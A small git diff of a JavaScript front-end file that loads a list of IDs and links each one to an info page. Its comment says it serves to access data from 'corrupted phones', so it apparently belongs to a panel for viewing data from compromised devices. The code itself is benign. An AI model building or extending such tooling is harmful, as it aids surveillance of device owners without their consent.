@@ -1,13 +1,12 @@
-// script.js
+// Displays the different ids of the corrupted phones to acceed the data related to these phones
 
 function loadFile() {
-    // Chemin d'accès au fichier (à personnaliser)
-    const filePath = '../data/ip.txt';
+    const filePath = '../data/id.txt';
 
     fetch(filePath)
         .then(response => response.text())
         .then(contents => displayFileContents(contents))
-        .catch(error => console.error('Erreur lors du chargement du fichier:', error));
+        .catch(error => console.error('An error occured while loading the file:', error));
 }
 
 function displayFileContents(contents) {
@@ -33,7 +32,7 @@ function displayFileContents(contents) {
                 const newPath = './info';
 
                 // Spécifiez le paramètre que vous souhaitez ajouter
-                const parameterName = 'phone_ip';
+                const parameterName = 'phone_id';
                 const parameterValue = String(line);
 
                 // Construire l'URL avec le paramètre
